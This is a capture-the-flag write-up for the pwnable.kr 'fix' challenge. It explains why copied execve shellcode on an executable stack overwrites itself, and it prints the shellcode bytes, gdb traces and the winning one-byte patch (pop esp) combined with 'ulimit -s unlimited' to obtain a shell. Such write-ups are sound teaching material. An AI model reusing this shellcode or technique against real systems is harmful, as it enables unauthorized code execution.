The solution for this problem isn't very intuitive.
If you do as I did and try bruteforce you might get upset :(,
bruteforce doesn't work since the exploit relies on using additional setup.
Let's do an analysis of the source first:

```c
#include <stdio.h>

// 23byte shellcode from http://shell-storm.org/shellcode/files/shellcode-827.php
char sc[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

void shellcode(){
	// a buffer we are about to exploit!
	char buf[20];

	// prepare shellcode on executable stack!
	strcpy(buf, sc);

	// overwrite return address!
	*(int*)(buf+32) = buf;

	printf("get shell\n");
}

int main(){
        printf("What the hell is wrong with my shellcode??????\n");
        printf("I just copied and pasted it from shell-storm.org :(\n");
        printf("Can you fix it for me?\n");

	unsigned int index=0;
	printf("Tell me the byte index to be fixed : ");
	scanf("%d", &index);
	fflush(stdin);

	if(index > 22)	return 0;

	int fix=0;
	printf("Tell me the value to be patched : ");
	scanf("%d", &fix);

	// patching my shellcode
	sc[index] = fix;

	// this should work..
	shellcode();
	return 0;
}
```
The code pretty much speaks for itself. Let's disassemble the shellcode
to see whether there is any problem with it:
```
   0:   31 c0                   xor    eax, eax
   2:   50                      push   eax
   3:   68 2f 2f 73 68          push   0x68732f2f
   8:   68 2f 62 69 6e          push   0x6e69622f
   d:   89 e3                   mov    ebx, esp
   f:   50                      push   eax
  10:   53                      push   ebx
  11:   89 e1                   mov    ecx, esp
  13:   b0 0b                   mov    al, 0xb
  15:   cd 80                   int    0x80
```
Unfortunately there's nothing wrong here.
The shellcode is essentially invoking `execve("/bin//sh")` system call, it should work fine,
so what's the problem with the program? Maybe we aren't
jumping to the shellcode correctly, let's inspect the instruction pointer after
leaving `shellcode`:
```
(gdb) x/10i $eip
=> 0xffde4d1c:	xor    eax,eax
   0xffde4d1e:	push   eax
   0xffde4d1f:	push   0x68732f2f
   0xffde4d24:	push   0x6e69622f
   0xffde4d29:	mov    ebx,esp
   0xffde4d2b:	push   eax
   0xffde4d2c:	push   ebx
   0xffde4d2d:	mov    ecx,esp
   0xffde4d2f:	mov    al,0xb
   0xffde4d31:	int    0x80
```
The jump is correct, what else could possibly be messed up?
To see the bug let's continue stepping through the shellcode:
```
(gdb) si
0xffde4d1e in ?? ()
(gdb)
0xffde4d1f in ?? ()
(gdb)
0xffde4d24 in ?? ()
(gdb)
0xffde4d29 in ?? ()
(gdb)
0xffde4d2b in ?? ()
(gdb) x/x $esp
0xffde4d34:	0x6e69622f                <---- note how at the third push esp points just after our shellcode.
(gdb) si
0xffde4d2c in ?? ()
(gdb) x/4i $eip
=> 0xffde4d2c:	push   ebx
   0xffde4d2d:	mov    ecx,esp
   0xffde4d2f:	mov    al,0x0
   0xffde4d31:	add    BYTE PTR [eax],al  <---- the fourth push made int 0x80 suddenly disappear.
(gdb) si
0xffde4d2d in ?? ()
(gdb) x/3i $eip
=> 0xffde4d2d:	dec    ebp                <-|
   0xffde4d2e:	fdivrp st(7),st           <-|-- the fifth push screwed the shellcode up even further.
   0xffde4d30:	add    BYTE PTR [eax],al  <-|
(gdb)
```

As we can see, since the shellcode is placed on the stack
it involuntarily overwrites itself via the five `push` instructions.
To fix this we would need to somehow get rid of two of the `push`es
by changing a single byte in the shellcode. This seems challenging!
I tried different onebyte pop instructions,
popping into a single register or even many registers simultaneously but
to no avail, what worked is as I mentioned in the beginning not really intuitive -
the solution is to replace the `push eax` with `pop esp`.
This would move the `0x6e69622f` (last value we pushed on the stack)
into `esp` so in this way the next `push` would
not overwrite the end of the shellcode.

But... is `0x6e6622f` even mapped to later `push ebx` on it and even if it is,
what and how many arguments would `argv[]` end up with?

To address the first question, no the memory is not initially mapped but there is a cool
`bash` builtin which can set up processes so that new memory get's mapped to
them the moment they access invalid memory through the `esp` register.
I am talking about the `ulimit` command we used in the [otp](otp.md) challenge.
If we call `ulimit -s unlimited` we would configure the stack size of processes we spawn to be unlimited.
This means that if the stack grows beyond it's location a page fault would not terminate
the process but grow the stack to include the new address in `esp`.
(I suppose that this is only possible when the address is not below any other mappings, just the stack).

For the second question, I don't know whether there is a guarantee for the newly mapped pages
to be zero-initialized but this seems to be true on the pwnable.kr server at least so
after we set `argv[0]` with the `push ebx; mov ecx, esp;`
the argument array will be zero-terminated as desired.

```
fix@pwnable:~$ ulimit -s unlimited
fix@pwnable:~$ ./fix
What the hell is wrong with my shellcode??????
I just copied and pasted it from shell-storm.org :(
Can you fix it for me?
Tell me the byte index to be fixed : 15
Tell me the value to be patched : 92
get shell
$ ls
fix  fix.c  flag  intended_solution.txt
$ cat flag
...(flag)...
```

If you think this solution was witty and cool check out the
`intended_solution.txt` file, it presents an approach that's even more ingenious!
